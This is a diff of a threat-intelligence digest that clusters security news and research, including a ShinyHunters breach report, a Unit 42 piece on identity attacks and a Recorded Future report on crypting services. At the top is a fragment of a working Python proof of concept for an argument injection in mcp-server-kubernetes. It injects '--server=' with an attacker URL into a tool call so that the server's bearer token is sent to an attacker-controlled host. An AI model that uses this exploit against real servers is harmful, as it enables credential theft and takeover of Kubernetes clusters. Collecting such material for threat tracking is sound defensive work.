argparse.ArgumentParser(description="CVE-2026-61459 PoC - MCP Server Kubernetes Argument Injection") parser.add_argument("--target", required=True, help="MCP Server JSON-RPC endpoint URL (e.g. http://localhost:8080/mcp)") parser.add_argument("--attacker", required=True, help="Attacker Kubernetes API server URL (e.g. http://attacker.example.com:6443)") parser.add_argument("--tool", default="kubectl_get", choices=["kubectl_get", "kubectl_describe", "kubectl_delete"], help="Tool to exploit") parser.add_argument("--namespace", default="default", help="Kubernetes namespace") args = parser.parse_args() # Malicious payload - inject --server via resourceType payload = { "jsonrpc": "2.0", "method": "tools/call", "params": { "name": args.tool, "arguments": { "resourceType": f"--server={args.attacker}", "name": "dummy-pod", "namespace": args.namespace, "output": "json" } }, "id": 1 } print(f"[+] Sending exploit to {args.target} using {args.tool}") print(f"[+] Attacker server: {args.attacker}") print("[+] Waiting for token exfiltration...") try: response = requests.post( args.target, json=payload, headers={"Content-Type": "application/json"}, timeout=10 ) print(f"[+] Response status: {response.status_code}") if response.status_code == 200: print("[+] Exploit sent successfully. Check your listener for the bearer token!") else: print(f"[-] Unexpected response: {response.text[:500]}") except Exception as e: print(f"[-] Error: {e}") if __name__ == "__main__": if len(sys.argv) < 2: print("Usage: python3 exploit.py --target <MCP_URL> --attacker <ATTACKER_URL>") sys.exit(1) main() Tags: Advisory/Source: Link Databases Links Sites Solutions Exploits Search Exploit-DB OffSec Courses and Certifications Google Hacking Submit Entry Kali Linux Learn Subscriptions Papers S
+```
+
+#### Corroborating sources (2)
+
+- **Exploit-DB** (offensive_vulnerability_research)
+  - Title: [remote] mcp-server-kubernetes 3.8.x - Argument Injection
+  - Published: 2026-08-11T00:00:00+00:00
+  - Link: https://www.exploit-db.com/exploits/52638
+  - Summary: mcp-server-kubernetes 3.8.x - Argument Injection
+- **Google Cloud Security** (cloud_identity_infrastructure)
+  - Title: ClusterNetworkPolicy in GKE: Balancing control and autonomy for your microservices
+  - Published: 2026-08-10T16:00:00+00:00
+  - Link: https://cloud.google.com/blog/products/networking/new-clusternetworkpolicy-in-gke/
+  - Summary: Managing network security in a multi-tenant Kubernetes environment typically requires balancing two distinct needs: developers need their microservices to communicate effectively, while platform and security teams must maintain compliance, prevent lateral movement, and establish cluster-wide guardrails. Historically, the standard Kubernetes NetworkPolicy has been the primary tool for this. While effective for single-namespace isolation, standard NetworkPolicy is scoped strictly to individual namespaces and designed around developer self-service. When cluster administrators attempt to use it for global security enforcement, it can lead to policy conflicts and operational challenges. To address this, we introduced ClusterNetworkPolicy (CNP) , an open-source standard developed by the Kubernetes SIG-Policy Working Group (WG), to Google Kubernetes Engine (GKE). Designed for scale, CNP is a cluster-wide resource that allows administrators to manage network security centrally, providing a mec
 
 ### Cluster c97f90a69b — score 15
 
@@ -2039,53 +2035,6 @@ Wiz Pricing Get a demo Get a demo Most application security programs assume a cl
   - Link: https://www.wiz.io/blog/securing-personal-repositories
   - Summary: Personal repositories are where corporate secrets quietly escape. Wiz correlates them to your developers, validates the real risk, and drives the fix.
 
-### Cluster 75a2a6649a — score 12
-
-- Title: RingCentral data breach exposed info of 1.6 million accounts
-- Source: BleepingComputer (cyber_news_breach_reporting)
-- Published: 2026-08-14T10:52:05+00:00
-- Link: https://www.bleepingcomputer.com/news/security/ringcentral-data-breach-exposed-info-of-16-million-accounts/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: ShinyHunters
-
-#### Cluster taxonomy (union across members)
-- threat_categories: data_breach, phishing_social_eng, ransomware_extortion, zero_day
-- actor_attribution: ShinyHunters
-- affected_products: Salesforce, Snowflake
-- urgency_signals: zero_day
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, phishing_social_eng, zero_day, data_breach
-- actor_attribution: ShinyHunters
-- affected_products: Salesforce, Snowflake
-- urgency_signals: zero_day
-- content_type: incident_report
-- confidence_tier: tier_4_news
-
-#### Summary
-
-```
-The ShinyHunters extortion group stole personal information from 1.6 million RingCentral accounts after hacking the company in July, according to the data breach notification service Have I Been Pwned. [...]
-```
-
-#### Full body
-
-```
-RingCentral data breach exposed info of 1.6 million accounts By Sergiu Gatlan August 14, 2026 06:52 AM 0 The ShinyHunters extortion group stole personal information from 1.6 million RingCentral accounts after hacking the company in July, according to the data breach notification service Have I Been Pwned. RingCentral is a cloud-based collaboration and communication platform used by over 600,000 businesses for services such as calling, messaging, and voicemail. The company disclosed the incident on July 28, revealing that its systems were compromised following what it described as a "sophisticated social engineering campaign." "We have not seen any new unauthorized activity since taking these remediation efforts. To date, this incident has affected data for a limited portion of RingCentral customers, and we are communicating with affected customers directly," it noted . "If you are not contacted by RingCentral, you are not affected. This incident did not impact the core RingCentral platform, and our services continue to operate without disruption." Although RingCentral has not attributed the breach to a specific threat actor or hacking group and has yet to share further details on the incident, the ShinyHunters extortion gang claimed responsibility on July 27, claiming they had stolen 623GB of data. RingCentral entry on ShinyHunters' data leak site (BleepingComputer) ​After the company refused to pay a ransom to have the stolen data destroyed, the cybercrime group leaked a compressed archive containing 280GB worth of files on their dark web leak site. While a RingCentral spokesperson didn't immediately reply when contacted by BleepingComputer to confirm ShinyHunters' claims, Have I Been Pwned confirmed the link after analyzing the leaked data and said on Thursday that it contained records for 1.6 million accounts , including names, email addresses, phone numbers, and physical addresses. "In July 2026, the cloud-based business communications platform RingCentral was the target of a ShinyHunters 'pay or leak' extortion campaign," it said. Although RingCentral has yet to share exactly how the threat actors gained access to its systems, ShinyHunters has claimed breaches at hundreds of Salesforce customers over the past year, saying they've stolen over 1.5 billion records in Salesloft Drift and Salesforce Aura campaigns. The extortion group was also linked to security breaches at more than a dozen Snowflake customers , as well as various other third-party integration providers . Most recently, ShinyHunters claimed responsibility for a new series of breaches at over 100 organizations following data-theft attacks that exploited an Oracle PeopleSoft zero-day flaw . Once attackers have valid credentials, only 37% of their actions are blocked Overall prevention scores can hide what happens after initial access. Once attackers are using valid credentials, prevention drops sharply. The Blue Report 2026 measures defenses technique by technique across 338 million simulations run in customer production environments. Get the report Related Articles: Kodak confirms data breach claimed by ShinyHunters extortion gang Council of Europe investigates ShinyHunters data breach claims Infinite Campus data breach affects 137,000 school staff accounts Valve notifies Steam hardware customers of a data breach Levi Strauss & Co. says hackers stole corporate data in cyberattack
-```
-
-#### Corroborating sources (1)
-
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - Title: RingCentral data breach exposed info of 1.6 million accounts
-  - Published: 2026-08-14T10:52:05+00:00
-  - Link: https://www.bleepingcomputer.com/news/security/ringcentral-data-breach-exposed-info-of-16-million-accounts/
-  - Summary: The ShinyHunters extortion group stole personal information from 1.6 million RingCentral accounts after hacking the company in July, according to the data breach notification service Have I Been Pwned. [...]
-
 ### Cluster 8eec2abce7 — score 12
 
 - Title: Microsoft patches LegacyHive Windows zero-day vulnerability
@@ -2230,6 +2179,53 @@ Table of Contents Introduction Technical analysis CoolClient components First st
   - Link: https://securelist.com/honeymyte-coolclient-driver-rootkit/121028/
   - Summary: Our experts discovered a new CoolClient backdoor variant with a kernel-mode rootkit driver that hides malicious processes, files, and network connections from security tools and threat analysts.
 
+### Cluster 75a2a6649a — score 11
+
+- Title: RingCentral data breach exposed info of 1.6 million accounts
+- Source: BleepingComputer (cyber_news_breach_reporting)
+- Published: 2026-08-14T10:52:05+00:00
+- Link: https://www.bleepingcomputer.com/news/security/ringcentral-data-breach-exposed-info-of-16-million-accounts/
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: ShinyHunters
+
+#### Cluster taxonomy (union across members)
+- threat_categories: data_breach, phishing_social_eng, ransomware_extortion, zero_day
+- actor_attribution: ShinyHunters
+- affected_products: Salesforce, Snowflake
+- urgency_signals: zero_day
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion, phishing_social_eng, zero_day, data_breach
+- actor_attribution: ShinyHunters
+- affected_products: Salesforce, Snowflake
+- urgency_signals: zero_day
+- content_type: incident_report
+- confidence_tier: tier_4_news
+
+#### Summary
+
+```
+The ShinyHunters extortion group stole personal information from 1.6 million RingCentral accounts after hacking the company in July, according to the data breach notification service Have I Been Pwned. [...]
+```
+
+#### Full body
+
+```
+RingCentral data breach exposed info of 1.6 million accounts By Sergiu Gatlan August 14, 2026 06:52 AM 0 The ShinyHunters extortion group stole personal information from 1.6 million RingCentral accounts after hacking the company in July, according to the data breach notification service Have I Been Pwned. RingCentral is a cloud-based collaboration and communication platform used by over 600,000 businesses for services such as calling, messaging, and voicemail. The company disclosed the incident on July 28, revealing that its systems were compromised following what it described as a "sophisticated social engineering campaign." "We have not seen any new unauthorized activity since taking these remediation efforts. To date, this incident has affected data for a limited portion of RingCentral customers, and we are communicating with affected customers directly," it noted . "If you are not contacted by RingCentral, you are not affected. This incident did not impact the core RingCentral platform, and our services continue to operate without disruption." Although RingCentral has not attributed the breach to a specific threat actor or hacking group and has yet to share further details on the incident, the ShinyHunters extortion gang claimed responsibility on July 27, claiming they had stolen 623GB of data. RingCentral entry on ShinyHunters' data leak site (BleepingComputer) ​After the company refused to pay a ransom to have the stolen data destroyed, the cybercrime group leaked a compressed archive containing 280GB worth of files on their dark web leak site. While a RingCentral spokesperson didn't immediately reply when contacted by BleepingComputer to confirm ShinyHunters' claims, Have I Been Pwned confirmed the link after analyzing the leaked data and said on Thursday that it contained records for 1.6 million accounts , including names, email addresses, phone numbers, and physical addresses. "In July 2026, the cloud-based business communications platform RingCentral was the target of a ShinyHunters 'pay or leak' extortion campaign," it said. Although RingCentral has yet to share exactly how the threat actors gained access to its systems, ShinyHunters has claimed breaches at hundreds of Salesforce customers over the past year, saying they've stolen over 1.5 billion records in Salesloft Drift and Salesforce Aura campaigns. The extortion group was also linked to security breaches at more than a dozen Snowflake customers , as well as various other third-party integration providers . Most recently, ShinyHunters claimed responsibility for a new series of breaches at over 100 organizations following data-theft attacks that exploited an Oracle PeopleSoft zero-day flaw . Once attackers have valid credentials, only 37% of their actions are blocked Overall prevention scores can hide what happens after initial access. Once attackers are using valid credentials, prevention drops sharply. The Blue Report 2026 measures defenses technique by technique across 338 million simulations run in customer production environments. Get the report Related Articles: Kodak confirms data breach claimed by ShinyHunters extortion gang Council of Europe investigates ShinyHunters data breach claims Infinite Campus data breach affects 137,000 school staff accounts Valve notifies Steam hardware customers of a data breach Levi Strauss & Co. says hackers stole corporate data in cyberattack
+```
+
+#### Corroborating sources (1)
+
+- **BleepingComputer** (cyber_news_breach_reporting)
+  - Title: RingCentral data breach exposed info of 1.6 million accounts
+  - Published: 2026-08-14T10:52:05+00:00
+  - Link: https://www.bleepingcomputer.com/news/security/ringcentral-data-breach-exposed-info-of-16-million-accounts/
+  - Summary: The ShinyHunters extortion group stole personal information from 1.6 million RingCentral accounts after hacking the company in July, according to the data breach notification service Have I Been Pwned. [...]
+
 ### Cluster b6abff1635 — score 11
 
 - Title: Logistics Giant Ceva Suffers Data Breach Impacting European Clients
@@ -2361,51 +2357,6 @@ Threat Research Center Threat Research Malware Malware The Permanent Threat: Ana
   - Link: https://unit42.paloaltonetworks.com/aeternum-blockchain-c2-analysis/
   - Summary: Analysis of the Aeternum botnet loader, a threat leveraging Polygon blockchain smart contracts for decentralized C2 infrastructure and payload execution. The post The Permanent Threat: Analyzing Aeternum’s Blockchain-Based C2 Operations and Communications appeared first on Unit 42 .
 
-### Cluster fb2a69eb0a — score 10
-
-- Title: Inside the Modern SOC: The Identity Front Door
-- Source: Unit 42 (threat_research_primary)
-- Published: 2026-08-07T23:00:01+00:00
-- Link: https://unit42.paloaltonetworks.com/soc-identity-front-door/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: credential_theft, mfa_bypass, phishing_social_eng, ransomware_extortion
-- actor_attribution: Scattered Spider
-- affected_industries: financial_services
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion, phishing_social_eng, credential_theft, mfa_bypass
-- actor_attribution: Scattered Spider
-- affected_industries: financial_services
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-Identity-based attacks drive 90% of incidents. Learn how modern attackers exploit identities and what SOC leaders can do to respond. The post Inside the Modern SOC: The Identity Front Door appeared first on Unit 42 .
-```
-
-#### Full body
-
-```
-Threat Research Center Insights Inside the Modern SOC Inside the Modern SOC Inside the Modern SOC: The Identity Front Door 3 min read Related Products Cortex Cortex XSIAM Managed Threat Hunting Unit 42 Managed Detection and Response Unit 42 Managed XSIAM By: Sharon Maydar Published: August 7, 2026 Categories: Inside the Modern SOC Insights Tags: AI Identity Social engineering Unit 42 Incident Response Report Share The Identity Gap: Why Trust Has Become the New Attack Surface In The 72-Minute Race , we explored how attackers are compressing the time between initial access and business impact. But as attacks continue to accelerate, another trend has emerged: Attackers are increasingly gaining access through compromised identities rather than exploiting technology vulnerabilities. According to the 2026 Unit 42 Global Incident Response Report , identity weaknesses played a role in nearly 90% of incidents investigated by Unit 42. The report also found that 65% of initial access activity involved identity-based techniques, underscoring how credential theft, multifactor authentication (MFA) manipulation, session hijacking and social engineering have become some of the most effective ways to gain access to enterprise environments. Anatomy of a Modern Identity-Driven Compromise Across recent Unit 42 investigations, we see a consistent pattern. Attackers often gain initial access through: Phishing campaigns Social engineering calls MFA fatigue attacks Compromised third-party accounts Misuse of help desk processes Once inside, attackers establish persistence, elevate privileges and move laterally across various environments. These activities often resemble legitimate administrative behavior. Malicious activity can remain hidden long enough for attackers to broaden their foothold before security teams recognize the full scope of the incident. The Attacker's Playbook in Action A social-first entry: Threat groups such as Muddled Libra (aka Scattered Spider) demonstrate how many attackers increasingly rely on social engineering and identity abuse as part of their toolkit. Expansion through identity: Once inside, attackers exploit identity weaknesses to establish persistence, compromise additional accounts and escalate privileges to strengthen their foothold. Each action expands their access and makes the compromise more difficult to contain. The escalating access: As highlighted in the 2026 Unit 42 Global Incident Response Report, 87% of incidents span multiple attack surfaces. An initial compromised identity can quickly become a multi-domain investigation that requires defenders to connect activity across the environment. The objective: Whether the objective is ransomware deployment, data theft, financial fraud or long-term persistence, identity compromise often serves as the foundation for broader attacker objectives. From a tooling perspective, the warning signs are often already present across the organization’s security controls. Without automated correlation, these signals can appear low priority in isolation, allowing attackers to expand their access before defenders recognize the full scope of the incident. How Our Unit 42 Managed Services Team Responds When investigating identity-driven attacks, our Unit 42 analysts use the Cortex SecOps platform to unify security telemetry into a single investigative view, allowing them to quickly validate suspicious activity and understand the full scope of the attack. Our 24/7 Managed Detection and Response (MDR) team continuously investigates suspicious activity while our threat hunters proactively search for signs of identity compromise that may not yet have generated an alert. AI-driven correlation, behavioral context and Unit 42 threat intelligence help our teams quickly validate high-confidence incidents and determine the full scope of attacker activity. Organizations using Managed XSIAM extend this approach through AI-driven correlation, integrated investigation and response workflows and c
-```
-
-#### Corroborating sources (1)
-
-- **Unit 42** (threat_research_primary)
-  - Title: Inside the Modern SOC: The Identity Front Door
-  - Published: 2026-08-07T23:00:01+00:00
-  - Link: https://unit42.paloaltonetworks.com/soc-identity-front-door/
-  - Summary: Identity-based attacks drive 90% of incidents. Learn how modern attackers exploit identities and what SOC leaders can do to respond. The post Inside the Modern SOC: The Identity Front Door appeared first on Unit 42 .
-
 ### Cluster 963c57eb1b — score 10
 
 - Title: DeadLock ransomware: Breaking down a Rust-based encryptor with decentralized recovery infrastructure
@@ -2455,47 +2406,6 @@ Share Link copied to clipboard! Tags Credential theft Extortion Ransomware Windo
   - Published: 2026-08-10T15:00:00+00:00
   - Link: https://www.microsoft.com/en-us/security/blog/2026/08/10/deadlock-ransomware-breaking-down-a-rust-based-encryptor-with-decentralized-recovery-infrastructure/
   - Summary: Microsoft Threat Intelligence examines DeadLock ransomware, an emerging financially motivated operation distinguished by its use of decentralized infrastructure to support victim communications, negotiations, and data leak operations alongside double extortion tactics used to pressure victims. The post DeadLock ransomware: Breaking down a Rust-based encryptor with decentralized recovery infrastructure appeared first on Microsoft Security Blog .
-
-### Cluster 44f04ecb50 — score 10
-
-- Title: Malware Crypting Services and the Threat Actors Who Sell Them
-- Source: Recorded Future (threat_research_primary)
-- Published: 2026-08-13T00:00:00+00:00
-- Link: https://www.recordedfuture.com/research/malware-crypting-services-threat-actors
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: (none)
-
-#### Cluster taxonomy (union across members)
-- threat_categories: ransomware_extortion
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Primary article taxonomy
-- threat_categories: ransomware_extortion
-- content_type: news_report
-- confidence_tier: tier_1_primary_research
-
-#### Summary
-
-```
-Insikt Group analyzes 24 threat actors selling malware crypting services. Learn about their evasion techniques, market dynamics, and how defenders can prioritize behavioral detection over static analysis.
-```
-
-#### Full body
-
-```
-Malware Crypting Services and the Threat Actors Who Sell Them Executive Summary Crypting services and products modify malicious payloads to help threat actors bypass detection, complicate analysis, and preserve malware usability after exposure. Although basic crypting consists of encrypting or obfuscating a customer-supplied payload, mature providers increasingly operate as broader malware-enablement services. Their offerings often combine payload wrapping, in-memory execution, anti-analysis checks, process injection, persistence options, delivery packaging, and post-detection “cleaning” or re-crypting services. Insikt Group analyzed 24 threat actors advertising crypting services and products within the past year and identified a market that is competitive, reputation-driven, and heavily focused on Windows payloads. Providers advertise through underground forums, restricted communities, chat platforms, clearnet sites, and social media accounts. They compete through tiered pricing, antivirus (AV) detection scores of crypted samples, discounts, malware-developer partnerships, private or shared stubs, and promised turnaround times for re-crypting detected payloads. Advertised crypter capabilities vary by provider, but the underlying objectives are consistent: reduce detection, delay or prevent analysis, and support stealthier payload execution. Because crypted payloads are designed to defeat both static and dynamic analysis, defenders should prioritize behavioral detection over static indicators. See the Outlook and Mitigations section for details. Key Findings AV and endpoint detection and response (EDR) tools should not be treated as sufficient standalone protection against crypted payloads. Defenders should pair endpoint controls with behavioral detection, telemetry correlation, upstream hunting, suspicious process monitoring, and rapid triage of suspicious samples. Popular crypting service providers primarily advertise support for Windows payloads, with no identified advertising for macOS or Linux crypting services. However, although Windows environments were most frequently targeted by the services reviewed in this report, they are not inherently more susceptible to the execution of crypted payloads. Crypted payloads increase the likelihood of successful malware execution and delayed detection, but they do not independently provide end-to-end intrusion capability. Downstream activities, such as lateral movement, data theft, ransomware deployment, and follow-on compromise, depend on the embedded malware and the operator's objectives. Crypter risk varies significantly with provider maturity and technical capability: advanced crypters offer portability, anti-analysis, process injection, persistence, and security product bypass capabilities, whereas less-advanced crypters generally provide basic payload obfuscation techniques. Crypter capabilities are generally not novel individually, but their commercial packaging makes established defense-evasion tradecraft easier to access, reuse, and operationalize. The significance of crypters lies less in technical innovation than in making mature evasion methods available as paid services. The Crypter Landscape What Is a “Crypter”? “Crypting” is what threat researchers generally refer to as a service or product wherein a file, almost exclusively a malicious executable of some kind, is encrypted to bypass malware detection technologies. The result of a crypting service is a malicious payload that modifies the supplied executable in ways that deter defenders and endpoint security solutions (namely, AV and EDR products) from detecting and analyzing it. How Does Crypting Work? While the core functionality of a crypting service or product is to encrypt a payload, services vary in the capabilities they provide. These capabilities can range from the encryption algorithms used, which are often proprietary, to behavioral adjustments for how the resultant payload will execute in a victim environmen
-```
-
-#### Corroborating sources (1)
-
-- **Recorded Future** (threat_research_primary)
-  - Title: Malware Crypting Services and the Threat Actors Who Sell Them
-  - Published: 2026-08-13T00:00:00+00:00
-  - Link: https://www.recordedfuture.com/research/malware-crypting-services-threat-actors
-  - Summary: Insikt Group analyzes 24 threat actors selling malware crypting services. Learn about their evasion techniques, market dynamics, and how defenders can prioritize behavioral detection over static analysis.
 
 ### Cluster 1e8cbb1e90 — score 10
 
@@ -2725,6 +2635,47 @@ Microsoft Patch Tuesday for August 2026 — Snort rules and prominent vulnerabil
   - Published: 2026-08-11T22:21:02+00:00
   - Link: https://blog.talosintelligence.com/microsoft-patch-tuesday-for-august-2026/
   - Summary: Microsoft has released its monthly security update for August 2026, which includes 421 vulnerabilities affecting a range of products, including 62 that Microsoft marked as "critical."
+
+### Cluster 44f04ecb50 — score 10
+
+- Title: Malware Crypting Services and the Threat Actors Who Sell Them
+- Source: Recorded Future (threat_research_primary)
+- Published: 2026-08-13T00:00:00+00:00
+- Link: https://www.recordedfuture.com/research/malware-crypting-services-threat-actors
+- Fetch status: ok
+- Member count: 1
+- Corroborating source count: 1
+- Strong signals: (none)
+
+#### Cluster taxonomy (union across members)
+- threat_categories: ransomware_extortion
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Primary article taxonomy
+- threat_categories: ransomware_extortion
+- content_type: news_report
+- confidence_tier: tier_1_primary_research
+
+#### Summary
+
+```
+Insikt Group analyzes 24 threat actors selling malware crypting services. Learn about their evasion techniques, market dynamics, and how defenders can prioritize behavioral detection over static analysis.
+```
+
+#### Full body
+
+```
+Malware Crypting Services and the Threat Actors Who Sell Them Executive Summary Crypting services and products modify malicious payloads to help threat actors bypass detection, complicate analysis, and preserve malware usability after exposure. Although basic crypting consists of encrypting or obfuscating a customer-supplied payload, mature providers increasingly operate as broader malware-enablement services. Their offerings often combine payload wrapping, in-memory execution, anti-analysis checks, process injection, persistence options, delivery packaging, and post-detection “cleaning” or re-crypting services. Insikt Group analyzed 24 threat actors advertising crypting services and products within the past year and identified a market that is competitive, reputation-driven, and heavily focused on Windows payloads. Providers advertise through underground forums, restricted communities, chat platforms, clearnet sites, and social media accounts. They compete through tiered pricing, antivirus (AV) detection scores of crypted samples, discounts, malware-developer partnerships, private or shared stubs, and promised turnaround times for re-crypting detected payloads. Advertised crypter capabilities vary by provider, but the underlying objectives are consistent: reduce detection, delay or prevent analysis, and support stealthier payload execution. Because crypted payloads are designed to defeat both static and dynamic analysis, defenders should prioritize behavioral detection over static indicators. See the Outlook and Mitigations section for details. Key Findings AV and endpoint detection and response (EDR) tools should not be treated as sufficient standalone protection against crypted payloads. Defenders should pair endpoint controls with behavioral detection, telemetry correlation, upstream hunting, suspicious process monitoring, and rapid triage of suspicious samples. Popular crypting service providers primarily advertise support for Windows payloads, with no identified advertising for macOS or Linux crypting services. However, although Windows environments were most frequently targeted by the services reviewed in this report, they are not inherently more susceptible to the execution of crypted payloads. Crypted payloads increase the likelihood of successful malware execution and delayed detection, but they do not independently provide end-to-end intrusion capability. Downstream activities, such as lateral movement, data theft, ransomware deployment, and follow-on compromise, depend on the embedded malware and the operator's objectives. Crypter risk varies significantly with provider maturity and technical capability: advanced crypters offer portability, anti-analysis, process injection, persistence, and security product bypass capabilities, whereas less-advanced crypters generally provide basic payload obfuscation techniques. Crypter capabilities are generally not novel individually, but their commercial packaging makes established defense-evasion tradecraft easier to access, reuse, and operationalize. The significance of crypters lies less in technical innovation than in making mature evasion methods available as paid services. The Crypter Landscape What Is a “Crypter”? “Crypting” is what threat researchers generally refer to as a service or product wherein a file, almost exclusively a malicious executable of some kind, is encrypted to bypass malware detection technologies. The result of a crypting service is a malicious payload that modifies the supplied executable in ways that deter defenders and endpoint security solutions (namely, AV and EDR products) from detecting and analyzing it. How Does Crypting Work? While the core functionality of a crypting service or product is to encrypt a payload, services vary in the capabilities they provide. These capabilities can range from the encryption algorithms used, which are often proprietary, to behavioral adjustments for how the resultant payload will execute in a victim environmen
+```
+
+#### Corroborating sources (1)
+
+- **Recorded Future** (threat_research_primary)
+  - Title: Malware Crypting Services and the Threat Actors Who Sell Them
+  - Published: 2026-08-13T00:00:00+00:00
+  - Link: https://www.recordedfuture.com/research/malware-crypting-services-threat-actors
+  - Summary: Insikt Group analyzes 24 threat actors selling malware crypting services. Learn about their evasion techniques, market dynamics, and how defenders can prioritize behavioral detection over static analysis.
 
 ### Cluster af5513db44 — score 10
 
@@ -3263,47 +3214,6 @@ Key Takeaways SOC automation hands a defined alert-handling task to software tha
   - Link: https://orca.security/resources/blog/soc-automation/
   - Summary: Key Takeaways SOC automation is the practice of handing a defined security operations task to software that runs it on a stated trigger, under a rule a person wrote. It covers enrichment, deduplication, case creation, evidence collection, and a bounded set of containment actions across the alerts a security operations center receives. The pipeline is […]
 
-### Cluster ab440398cd — score 9
-
-- Title: What’s new with Google Cloud
-- Source: Google Cloud Security (cloud_identity_infrastructure)
-- Published: 2026-08-14T16:00:00+00:00
-- Link: https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/
-- Fetch status: ok
-- Member count: 1
-- Corroborating source count: 1
-- Strong signals: Google Cloud
-
-#### Cluster taxonomy (union across members)
-- affected_products: Google Cloud
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Primary article taxonomy
-- affected_products: Google Cloud
-- content_type: news_report
-- confidence_tier: tier_2_operator
-
-#### Summary
-
-```
-Want to know the latest from Google Cloud? Find it here in one handy location. Check back regularly for our newest updates, announcements, resources, events, learning opportunities, and more. Tip : Not sure where to find what you’re looking for on the Google Cloud blog? Start here: Google Cloud blog 101: Full list of topics, links, and resources . aside_block <ListValue: []> Aug 10 - Aug 14 Diagnosing Apigee Hybrid Cassandra Read Latency for Peak Performance Diagnose real-time Cassandra read latency and resolve API key verification bottlenecks in Apigee Hybrid with this step-by-step troubleshooting guide. Learn how to deploy a debugging client and query performance tables to maintain sub-millisecond response times. Read the Apigee Hybrid Cassandra Troubleshooting Guide Keep moving with agents! The All Things Agentic Hackathon is officially live. We're challenging builders to build next-generation agents that take on the busy work and handle the heavy lifting in the background using Gem
-```
-
-#### Full body
-
-```
-Inside Google Cloud What’s new with Google Cloud August 14, 2026 Google Cloud Content & Editorial Try Gemini Enterprise Business Edition today The front door to AI in the workplace Try now Want to know the latest from Google Cloud? Find it here in one handy location. Check back regularly for our newest updates, announcements, resources, events, learning opportunities, and more. Tip : Not sure where to find what you’re looking for on the Google Cloud blog? Start here: Google Cloud blog 101: Full list of topics, links, and resources . Aug 10 - Aug 14 Diagnosing Apigee Hybrid Cassandra Read Latency for Peak Performance Diagnose real-time Cassandra read latency and resolve API key verification bottlenecks in Apigee Hybrid with this step-by-step troubleshooting guide. Learn how to deploy a debugging client and query performance tables to maintain sub-millisecond response times. Read the Apigee Hybrid Cassandra Troubleshooting Guide Keep moving with agents! The All Things Agentic Hackathon is officially live. We're challenging builders to build next-generation agents that take on the busy work and handle the heavy lifting in the background using Gemini 3.5 and Google Cloud. Compete for your share of $190,000 in prizes, cash, and Google Cloud credits! Submissions are open from August 3, 2026, to August 31, 2026. Learn more and register . Sign up for GEAR to get exclusive updates and your badge. #AllThingsAgenticHackathon Accelerate PostgreSQL migrations using Gemini in Database Migration Service Enterprise database migrations often stall during the "last mile" of translating legacy stored procedures, triggers, and custom functions from Oracle or SQL Server. Database Migration Service (DMS) now provides AI-assisted code conversion powered by Gemini in Databases. By combining deterministic compiler rules for 1:1 syntax with Gemini contextual synthesis for complex procedural blocks, DMS converts legacy code into native PostgreSQL and AlloyDB with full schema awareness and side-by-side validation. Read the full blog post to learn how to streamline your database code conversion. Compute Flex CUDs now available for G2 and G4 GPU VMs Compute Flexible Committed Use Discounts (Flex CUDs) are now available for G2 (NVIDIA L4) and G4 (NVIDIA RTX Pro 6000) VMs . You can now lock in predictable savings while retaining the flexibility to adapt across VM families, migrate between regions, and combine general-purpose compute, GKE, Cloud Run, and G2 & G4 GPU VMs under a single spend commitment. Flex CUDs for G-series VMs let you lock in savings today while preserving the agility to upgrade to latest hardware without disruption! Explore VM instance pricing or learn more about Flex CUDs . Rapid Bucket accelerates the training and checkpoint performance in PyTorch Ecosystem via GCSFS With the release of GCSFS 2026.8.0 , organisations can now unlock maximum ROI from their AI/ML infrastructure by eliminating data starvation on GPUs in PyTorch ecosystem when they are using Frameworks like Dask, Pandas, PyTorch , PyTorch Lightning, Hugging Face Datasets, Ray dataetc. By making adaptive concurrent prefetching the default, GCSFS dynamically predicts and background-fetches sequential read patterns—boosting single-file throughput by 5x, and scaling up to 21 GiB/s , saturating the NIC when paired with Rapid Bucket . Saturating the NIC translates to significantly improved accelerator goodput and reduced training wait times with zero integration friction. Training and checkpoint restore workflows benefit from intelligent memory management that automatically drains the buffer during random reads to completely avoid bandwidth or memory penalties. Aug 3 - Aug 7 Navigate data sovereignty and AI innovation with hybrid cloud For enterprises facing strict compliance rules, keeping sensitive data on-premises often means missing out on cutting-edge AI. Data from the 2026 State of AI Infrastructure report reveals that 52% of IT leaders are adopting hybrid cloud strategies to
-```
-
-#### Corroborating sources (1)
-
-- **Google Cloud Security** (cloud_identity_infrastructure)
-  - Title: What’s new with Google Cloud
-  - Published: 2026-08-14T16:00:00+00:00
-  - Link: https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/
-  - Summary: Want to know the latest from Google Cloud? Find it here in one handy location. Check back regularly for our newest updates, announcements, resources, events, learning opportunities, and more. Tip : Not sure where to find what you’re looking for on the Google Cloud blog? Start here: Google Cloud blog 101: Full list of topics, links, and resources . aside_block <ListValue: []> Aug 10 - Aug 14 Diagnosing Apigee Hybrid Cassandra Read Latency for Peak Performance Diagnose real-time Cassandra read latency and resolve API key verification bottlenecks in Apigee Hybrid with this step-by-step troubleshooting guide. Learn how to deploy a debugging client and query performance tables to maintain sub-millisecond response times. Read the Apigee Hybrid Cassandra Troubleshooting Guide Keep moving with agents! The All Things Agentic Hackathon is officially live. We're challenging builders to build next-generation agents that take on the busy work and handle the heavy lifting in the background using Gem
-
 ### Cluster f747f77112 — score 9
 
 - Title: Max severity SAP Commerce Cloud flaw now targeted in attacks
@@ -3352,6 +3262,47 @@ Max severity SAP Commerce Cloud flaw now targeted in attacks By Sergiu Gatlan Au
   - Published: 2026-08-14T13:45:18+00:00
